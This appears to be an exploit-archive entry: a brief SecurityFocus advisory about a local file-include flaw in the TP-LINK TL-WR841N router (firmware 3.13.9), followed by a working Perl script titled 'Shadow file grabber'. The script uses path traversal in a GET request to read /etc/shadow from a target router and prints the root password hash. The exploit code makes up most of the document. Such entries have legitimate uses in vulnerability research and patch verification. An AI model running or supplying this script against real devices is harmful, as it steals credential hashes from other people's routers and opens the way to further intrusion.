source: http://www.securityfocus.com/bid/56320/info

TP-LINK TL-WR841N router is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute local scripts in the context of the affected device. This may aid in further attacks.

TP-LINK TL-WR841N 3.13.9 Build 120201 Rel.54965n is vulnerable; other versions may also be affected. 

#TP-LINK TL-WR841N Shadow file grabber#

#built by Pulse matan () madsec co il#

#enjoy#

 

use LWP::UserAgent;

$host = $ARGV[0];

chomp($host);

if($host !~ /http:\/\//) { $host = "http://$host";; };

 

my $ua = LWP::UserAgent->new;

$ua->timeout(30);

$lfi = "/help/../../../../../../../../etc/shadow";

$url = $host.$lfi;

$request = HTTP::Request->new('GET', $url);

$response = $ua->request($request);

my $html = $response->content;          

if($html =~ /root/) {

print "root$' \n" ;

}
